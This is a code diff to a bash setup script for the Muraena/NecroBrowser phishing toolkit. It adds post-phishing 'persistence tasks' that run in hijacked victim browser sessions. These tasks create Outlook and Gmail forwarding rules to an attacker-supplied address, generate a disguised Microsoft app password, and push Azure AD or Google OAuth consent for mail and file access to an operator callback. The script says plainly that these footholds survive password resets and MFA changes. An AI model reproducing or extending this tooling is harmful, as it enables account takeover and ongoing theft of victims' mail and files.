@@ -23,14 +23,38 @@ set -euo pipefail
 #   MURAENA_REDIRECTOR_TYPE     comma-separated types matching each IP (default: nginx for each)
 #   MURAENA_TELEGRAM_TOKEN      optional
 #   MURAENA_TELEGRAM_CHAT_ID    optional
+#
+# Persistence task CI variables (all optional; only used when SESSION_MODE=2 or 3):
+#   MURAENA_PERSIST_OUTLOOK     true — create OWA forwarding rule
+#   MURAENA_PERSIST_APP_PW      true — create Microsoft app password
+#   MURAENA_PERSIST_OAUTH       true — authorize OAuth app (Azure AD or Google)
+#   MURAENA_PERSIST_GMAIL       true — create Gmail forwarding rule + filter
+#   MURAENA_PERSIST_FORWARD_TO  email address to forward mail to (Outlook + Gmail)
+#   MURAENA_PERSIST_OAUTH_PLATFORM  azure|google (default: azure)
+#   MURAENA_PERSIST_CLIENT_ID   OAuth app client_id
+#   MURAENA_PERSIST_REDIRECT_URI OAuth app redirect_uri (your callback server)
+#   MURAENA_PERSIST_SCOPES      space-separated OAuth scopes (provider-specific defaults used if omitted)
+#   MURAENA_PERSIST_TENANT      Azure tenant: common|organizations|<tenant-id>  (default: common)
 # ─────────────────────────────────────────────────────────────────────────────
 
 CI_MODE=false
 [[ "${1:-}" == "--ci" ]] && CI_MODE=true
 
-# Global arrays — must be initialised before any function runs (set -u safety)
+# Global arrays / vars — must be initialised before any function runs (set -u safety)
 REDIRECTOR_IPS=()
 REDIRECTOR_TYPES=()
+
+# Persistence task settings (populated by gather_config)
+PERSIST_OUTLOOK="N"
+PERSIST_APP_PW="N"
+PERSIST_OAUTH="N"
+PERSIST_GMAIL="N"
+PERSIST_FORWARD_TO=""
+PERSIST_OAUTH_PLATFORM="azure"
+PERSIST_CLIENT_ID=""
+PERSIST_REDIRECT_URI=""
+PERSIST_SCOPES=""
+PERSIST_TENANT="common"
 
 BOLD="\033[1m"
 GREEN="\033[32m"
@@ -502,6 +526,23 @@ gather_config() {
         NECRO_ENDPOINT=""
         [[ "$SESSION_MODE" == "2" ]] && NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
         [[ "$SESSION_MODE" == "3" ]] && NECRO_ENDPOINT="${MURAENA_NECRO_ENDPOINT:?MURAENA_NECRO_ENDPOINT must be set when SESSION_MODE=3}"
+        # Persistence tasks (only meaningful when SESSION_MODE=2 or 3)
+        if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
+            local _po="${MURAENA_PERSIST_OUTLOOK:-false}"
+            [[ "$_po" == "true" || "$_po" =~ ^[Yy]$ ]] && PERSIST_OUTLOOK="Y" || PERSIST_OUTLOOK="N"
+            local _pa="${MURAENA_PERSIST_APP_PW:-false}"
+            [[ "$_pa" == "true" || "$_pa" =~ ^[Yy]$ ]] && PERSIST_APP_PW="Y" || PERSIST_APP_PW="N"
+            local _pg="${MURAENA_PERSIST_GMAIL:-false}"
+            [[ "$_pg" == "true" || "$_pg" =~ ^[Yy]$ ]] && PERSIST_GMAIL="Y" || PERSIST_GMAIL="N"
+            local _poa="${MURAENA_PERSIST_OAUTH:-false}"
+            [[ "$_poa" == "true" || "$_poa" =~ ^[Yy]$ ]] && PERSIST_OAUTH="Y" || PERSIST_OAUTH="N"
+            PERSIST_FORWARD_TO="${MURAENA_PERSIST_FORWARD_TO:-}"
+            PERSIST_OAUTH_PLATFORM="${MURAENA_PERSIST_OAUTH_PLATFORM:-azure}"
+            PERSIST_CLIENT_ID="${MURAENA_PERSIST_CLIENT_ID:-}"
+            PERSIST_REDIRECT_URI="${MURAENA_PERSIST_REDIRECT_URI:-}"
+            PERSIST_SCOPES="${MURAENA_PERSIST_SCOPES:-}"
+            PERSIST_TENANT="${MURAENA_PERSIST_TENANT:-common}"
+        fi
         info "CI mode — config loaded."
         info "  Domain   : ${PHISHING_DOMAIN} → ${TARGET_DOMAIN}"
         info "  TLS      : ${TLS_CHOICE}"
@@ -614,6 +655,137 @@ gather_config() {
         ask "Task type (office365/github/generic):"
         read -r NECRO_TASK_TYPE
         NECRO_TASK_TYPE="${NECRO_TASK_TYPE:-generic}"
+    fi
+
+    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
+        section "Post-Phishing Persistence Tasks"
+        echo "  These tasks run in the captured browser session and create footholds"
+        echo "  that survive password resets and MFA changes."
+        echo ""
+
+        # ── Microsoft 365 ──────────────────────────────────────────────────────
+        echo -e "  ${BOLD}Microsoft 365 / Azure AD${RESET}"
+        ask "  Enable OWA inbox forwarding rule? [y/N]:"
+        read -r PERSIST_OUTLOOK
+        PERSIST_OUTLOOK="${PERSIST_OUTLOOK:-N}"
+
+        ask "  Enable Microsoft app password creation? [y/N]:"
+        read -r PERSIST_APP_PW
+        PERSIST_APP_PW="${PERSIST_APP_PW:-N}"
+
+        ask "  Enable Azure AD OAuth app authorization? [y/N]:"
+        read -r PERSIST_OAUTH
+        PERSIST_OAUTH="${PERSIST_OAUTH:-N}"
+
+        # ── Google Workspace ───────────────────────────────────────────────────
+        echo ""
+        echo -e "  ${BOLD}Google Workspace${RESET}"
+        ask "  Enable Gmail forwarding rule? [y/N]:"
+        read -r PERSIST_GMAIL
+        PERSIST_GMAIL="${PERSIST_GMAIL:-N}"
+
+        ask "  Enable Google OAuth app authorization? [y/N]:"
+        read -r _google_oauth
+        _google_oauth="${_google_oauth:-N}"
+        # Google OAuth reuses the same AuthorizeOAuthApp task; only ask the OAuth
+        # questions once even if user enables both Azure and Google.
+        [[ "$_google_oauth" =~ ^[Yy]$ ]] && PERSIST_OAUTH="Y"
+
+        # ── shared forwarding email ────────────────────────────────────────────
+        if [[ "$PERSIST_OUTLOOK" =~ ^[Yy]$ || "$PERSIST_GMAIL" =~ ^[Yy]$ ]]; then
+            echo ""
+            ask "  Attacker email to forward captured mail to:"
+            read -r PERSIST_FORWARD_TO
+            [[ -z "$PERSIST_FORWARD_TO" ]] && warn "No forwarding address set — forwarding tasks will be skipped."
+        fi
+
+        # ── OAuth app details ──────────────────────────────────────────────────
+        if [[ "$PERSIST_OAUTH" =~ ^[Yy]$ ]]; then
+            echo ""
+            echo -e "  ${BOLD}OAuth App Setup${RESET}"
+            echo "  You must pre-register an app in Azure AD or Google Cloud Console."
+            echo "  Setup will build the authorization URL from your values."
+            echo ""
+
+            if [[ "$_google_oauth" =~ ^[Yy]$ && ! "$PERSIST_OAUTH" =~ ^[Yy] ]]; then
+                PERSIST_OAUTH_PLATFORM="google"
+            else
+                echo "  Platform:"
+                echo "    1) Azure AD (Microsoft 365)"
+                echo "    2) Google Workspace"
+                ask "  Choose [1/2] (default: 1):"
+                read -r _plat_choice
+                case "${_plat_choice:-1}" in
+                    2) PERSIST_OAUTH_PLATFORM="google" ;;
+                    *) PERSIST_OAUTH_PLATFORM="azure"  ;;
+                esac
+            fi
+
+            ask "  Client ID (application/client ID from app registration):"
+            read -r PERSIST_CLIENT_ID
+            [[ -z "$PERSIST_CLIENT_ID" ]] && error "Client ID is required for OAuth persistence."
+
+            ask "  Redirect URI (your callback server, e.g. https://${PHISHING_DOMAIN}/callback):"
+            read -r PERSIST_REDIRECT_URI
+            PERSIST_REDIRECT_URI="${PERSIST_REDIRECT_URI:-https://${PHISHING_DOMAIN}/callback}"
+
+            if [[ "$PERSIST_OAUTH_PLATFORM" == "azure" ]]; then
+                echo ""
+                echo "  Tenant:"
+                echo "    1) common       — any Microsoft account or work/school account (recommended)"
+                echo "    2) organizations — work/school accounts only"
+                echo "    3) Custom       — specific tenant ID (when targeting a known org)"
+                ask "  Choose [1/2/3] (default: 1):"
+                read -r _tenant_choice
+                case "${_tenant_choice:-1}" in
+                    2) PERSIST_TENANT="organizations" ;;
+                    3)
+                        ask "  Tenant ID:"
+                        read -r PERSIST_TENANT
+                        [[ -z "$PERSIST_TENANT" ]] && PERSIST_TENANT="common"
+                        ;;
+                    *) PERSIST_TENANT="common" ;;
+                esac
+
+                echo ""
+                echo "  Scopes (space-separated delegated permissions)."
+                echo "  Default: offline_access Mail.Read Files.Read.All User.Read"
+                echo "  Add more (e.g. Calendars.Read Mail.Send) or press Enter for defaults."
+                ask "  Scopes:"
+                read -r PERSIST_SCOPES
+                PERSIST_SCOPES="${PERSIST_SCOPES:-offline_access Mail.Read Files.Read.All User.Read}"
+            else
+                echo ""
+                echo "  Scopes (space-separated)."
+                echo "  Default: https://mail.google.com/ https://www.googleapis.com/auth/drive.readonly"
+                ask "  Scopes:"
+                read -r PERSIST_SCOPES
+                PERSIST_SCOPES="${PERSIST_SCOPES:-https://mail.google.com/ https://www.googleapis.com/auth/drive.readonly}"
+            fi
+
+            # Build and display the consent URL so the operator can verify it
+            local encoded_redirect encoded_scopes consent_url
+            encoded_redirect=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1],safe=''))" "$PERSIST_REDIRECT_URI" 2>/dev/null \
+                            || python  -c "import urllib,sys; print(urllib.quote(sys.argv[1],safe=''))" "$PERSIST_REDIRECT_URI" 2>/dev/null \
+                            || echo "$PERSIST_REDIRECT_URI")
+            encoded_scopes=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1],safe=''))" "$PERSIST_SCOPES" 2>/dev/null \
+                           || python  -c "import urllib,sys; print(urllib.quote(sys.argv[1],safe=''))" "$PERSIST_SCOPES" 2>/dev/null \
+                           || echo "$PERSIST_SCOPES")
+
+            if [[ "$PERSIST_OAUTH_PLATFORM" == "azure" ]]; then
+                consent_url="https://login.microsoftonline.com/${PERSIST_TENANT}/oauth2/v2.0/authorize?client_id=${PERSIST_CLIENT_ID}&response_type=code&redirect_uri=${encoded_redirect}&scope=${encoded_scopes}&state=CAMPAIGN_ID"
+            else
+                consent_url="https://accounts.google.com/o/oauth2/v2/auth?client_id=${PERSIST_CLIENT_ID}&redirect_uri=${encoded_redirect}&response_type=code&scope=${encoded_scopes}&access_type=offline&prompt=consent"
+            fi
+
+            echo ""
+            info "Generated consent URL:"
+            echo "  ${consent_url}"
+            echo ""
+            warn "Replace &state=CAMPAIGN_ID with the victim's tracker ID before use."
+            warn "Make sure https://${PHISHING_DOMAIN}/callback (or your redirect URI) is live to receive auth codes."
+            echo ""
+        fi
     fi
 
     section "Telegram Alerts"
@@ -756,19 +928,111 @@ TOML
 
 write_necro_profile() {
     local task_type="${NECRO_TASK_TYPE:-generic}"
+    mkdir -p config
+
+    # Build the persistence tasks array from the choices gathered interactively or
+    # from CI env vars.  Each enabled task becomes a JSON object in the array.
+    local tasks_json=""
+    local sep=""
+
+    _append_task() {
+        tasks_json+="${sep}
+    $1"
+        sep=","
+    }
+
+    if [[ "$PERSIST_OUTLOOK" =~ ^[Yy]$ && -n "$PERSIST_FORWARD_TO" ]]; then
+        _append_task "{
+      \"label\": \"outlook-forwarding\",
+      \"type\":  \"persistence\",
+      \"name\":  \"OutlookForwardingRule\",
+      \"params\": {
+        \"fixSession\": \"https://outlook.office.com/mail/inbox\",
+        \"forwardTo\":  \"${PERSIST_FORWARD_TO}\",
+        \"ruleName\":   \"Sync Rule\",
+        \"keepCopy\":   true
+      }
+    }"
+    fi
+
+    if [[ "$PERSIST_APP_PW" =~ ^[Yy]$ ]]; then
+        _append_task "{
+      \"label\": \"app-password\",
+      \"type\":  \"persistence\",
+      \"name\":  \"AddAppPassword\",
+      \"params\": {
+        \"fixSession\": \"https://mysignins.microsoft.com/security-info\",
+        \"appName\":    \"Mobile Sync\"
+      }
+    }"
+    fi
+
+    if [[ "$PERSIST_OAUTH" =~ ^[Yy]$ && -n "$PERSIST_CLIENT_ID" ]]; then
+        # Build the consent URL for embedding in the profile
+        local encoded_redirect encoded_scopes consent_url
+        encoded_redirect=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1],safe=''))" "$PERSIST_REDIRECT_URI" 2>/dev/null \
+                        || echo "$PERSIST_REDIRECT_URI")
+        encoded_scopes=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1],safe=''))" "$PERSIST_SCOPES" 2>/dev/null \
+                       || echo "$PERSIST_SCOPES")
+        if [[ "$PERSIST_OAUTH_PLATFORM" == "azure" ]]; then
+            consent_url="https://login.microsoftonline.com/${PERSIST_TENANT}/oauth2/v2.0/authorize?client_id=${PERSIST_CLIENT_ID}&response_type=code&redirect_uri=${encoded_redirect}&scope=${encoded_scopes}&state=%%%TRACKER%%%"
+            _append_task "{
+      \"label\": \"oauth-app-authorization\",
+      \"type\":  \"persistence\",
+      \"name\":  \"AuthorizeOAuthApp\",
+      \"params\": {
+        \"fixSession\":  \"https://www.office.com\",
+        \"consentUrl\":  \"${consent_url}\"
+      }
+    }"
+        else
+            consent_url="https://accounts.google.com/o/oauth2/v2/auth?client_id=${PERSIST_CLIENT_ID}&redirect_uri=${encoded_redirect}&response_type=code&scope=${encoded_scopes}&access_type=offline&prompt=consent&state=%%%TRACKER%%%"
+            _append_task "{
+      \"label\": \"google-oauth-app\",
+      \"type\":  \"persistence\",
+      \"name\":  \"GoogleOAuthApp\",
+      \"params\": {
+        \"fixSession\":  \"https://mail.google.com/mail/u/0/\",
+        \"consentUrl\":  \"${consent_url}\"
+      }
+    }"
+        fi
+    fi
+
+    if [[ "$PERSIST_GMAIL" =~ ^[Yy]$ && -n "$PERSIST_FORWARD_TO" ]]; then
+        _append_task "{
+      \"label\": \"gmail-forwarding\",
+      \"type\":  \"persistence\",
+      \"name\":  \"GmailForwardingRule\",
+      \"params\": {
+        \"fixSession\": \"https://mail.google.com/mail/u/0/\",
+        \"forwardTo\":  \"${PERSIST_FORWARD_TO}\"
+      }
+    }"
+    fi
+
+    # If no persistence tasks were configured, fall back to a basic screenshot task
+    if [[ -z "$tasks_json" ]]; then
+        tasks_json="{
+      \"label\": \"screenshot\",
+      \"type\":  \"${task_type}\",
+      \"name\":  \"ScreenshotPages\",
+      \"params\": {
+        \"fixSession\":  \"https://${TARGET_DOMAIN}\",
+        \"credentials\": %%%CREDENTIALS%%%,
+        \"tokens\":      %%%TOKENS%%%
+      }
+    }"
+    fi
+
     cat > config/instrument.necro <<JSON
 {
-  "name": "%%%TRACKER%%%",
-  "task": {
-    "type": "${task_type}",
-    "name": ["ScreenshotPages"],
-    "params": {
-      "fixSession": "https://${TARGET_DOMAIN}",
-      "credentials": %%%CREDENTIALS%%%,
-      "tokens": %%%TOKENS%%%
-    }
-  },
-  "cookies": %%%COOKIES%%%
+  "tracker":     "%%%TRACKER%%%",
+  "cookies":     %%%COOKIES%%%,
+  "credentials": %%%CREDENTIALS%%%,
+
+  "tasks": [${tasks_json}
+  ]
 }
 JSON
     info "config/instrument.necro written."
